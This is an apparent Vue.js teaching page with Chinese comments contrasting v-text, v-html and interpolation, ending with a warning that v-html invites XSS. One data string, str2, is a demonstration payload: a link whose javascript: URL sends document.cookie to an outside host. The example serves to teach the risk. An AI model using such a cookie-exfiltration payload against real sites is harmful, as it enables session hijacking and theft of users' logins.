<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <script src="../js/vue.js"></script>
</head>
<body>
  <div id="root">
    <div>ni,{{name}}</div>
    <div v-text="name">hi,</div>
    <!-- 不同：v-text情况下 hi,会被覆盖 -->
    <div v-html="str">hi,</div>
    <!-- 将里面所有内容当做文本区解析，不会解析标签 -->
    <div v-html="str2"></div>
  </div>

  
</body>
<script>
  new Vue({
    el:'#root',
    data:{
      name:'佛祖',
      str:'<h3>你好啊</h3>',
      str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>全场零元起</a>'
    }
  })
  
</script>
</html>

<!-- 
V- htm1指令:

1.作用:向指定节点中渲染包含html结构的内容。

2.与插值语法的区别:
(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
(2).v-html可以识别html结构。

3.严重注意: v-html有安全性问题! ! ! !
(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSs攻击。
(2).一定要在可信的内容上使用v-html,永不要用在用户提交的内容上! 
-->
